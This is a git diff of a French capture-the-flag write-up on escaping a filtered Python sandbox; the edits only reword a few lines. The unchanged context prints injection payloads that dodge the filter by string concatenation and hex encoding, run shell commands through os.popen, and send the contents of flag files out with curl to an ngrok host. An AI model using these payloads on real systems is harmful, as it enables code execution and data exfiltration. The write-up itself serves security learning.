@@ -20,7 +20,7 @@
 ![image](https://user-images.githubusercontent.com/74382279/157318532-29ad4480-d328-4db3-afcd-5042f5be7e0e.png)
 
 - Je vais devoir builtin des fontions à partir de la class ``__builtins__``.
-- La méthode ``getattr()`` renvoie la valeur de l'attribut nommé d'un objet. S'il n'est pas trouvé, il renvoie la valeur par défaut fournie à la fonction.
+- La méthode ``getattr()`` renvoie la valeur de l'attribut nommé d'une class. S'il n'est pas trouvé, il renvoie la valeur par défaut fournie à la fonction.
 - ``);geattr(__builtins__,'__imp''ort__')('o''s').popen('id')#``, par défaut j'utilise une méthode de concaténation pour éviter de faire trigger la commande par le filtre.
 - N'oublions pas que la méthode ``read()`` n'est pas acceptée. Dans ce contexte on est supposé d'envoyer la requête en stdout vers un serveur web qu'on hébergera localement pour recept les données ``POST``. Tout ça ``OOB`` (Out of band). Les données ``OOB`` sont transférées via un flux indépendant du flux de données principal dans la bande.
 - J'utilise Wampserv comme hébergeur local. First of all je script la fonction suivante en ``PHP``:
@@ -58,7 +58,7 @@ echo file_get_contents("data.txt");
 
 ``);geattr(__builtins__,'__imp''ort__')('o''s').popen(''.join([chr(int(''.join(c),16)) for s in zip('6375726c'[0::2],'6375726c'[1::2])])+'\x20-X\x20POST\x20-d\x20\x22data=$(cat flag/*)\x22\x20https://rand.ngrok.io/tmp')#``
 
-- J'ai bien aimé l'approche du challenge. Je tiens à préciser que plusieurs techniques d'importation de l'objet ``__builtins__`` étaient filtrés:
+- J'ai bien aimé l'approche du challenge. Je tiens à préciser que plusieurs techniques d'importation de la class ``__builtins__`` étaient filtrés:
 ```py
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
